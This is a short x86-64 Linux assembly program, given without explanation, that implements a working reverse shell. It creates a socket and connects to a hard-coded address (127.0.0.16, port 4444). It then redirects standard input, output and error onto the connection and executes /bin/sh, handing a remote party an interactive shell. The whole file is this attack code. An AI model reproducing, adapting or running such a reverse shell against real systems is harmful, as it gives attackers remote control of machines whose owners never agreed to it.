section .bss
        buf_recv        resb 512
section .text
        global _start
_start:
; SOCKET
        mov rax, 41
        mov rdi, 2
        mov rsi, 1
        xor rdx, rdx
        syscall
        xchg r12, rax

        sub rsp, 32
        mov word [rsp], 2
        mov word [rsp+2], 0x5c11
        mov dword [rsp+4], 0x1000007f
        mov qword [rsp+8], 0
; CONNECT
        mov rax, 42
        mov rdi, r12
        lea rsi, [rsp]
        mov rdx, 16
        syscall
; DUP
        xor rsi, rsi
        mov rdi, r12
loop_dup2:
        mov rax, 33
        syscall

        inc rsi
        cmp rsi, 3
        jl loop_dup2
; EXECVE
        mov rbx, 0x0068732f6e69622f
        mov [rsp], rbx
        mov qword [rsp+8], 0
        lea rdi, [rsp]
        mov [rsp+16], rdi
        mov qword [rsp+24], 0
        mov rax, 59
        lea rsi, [rsp+16]
        xor rdx, rdx
        syscall
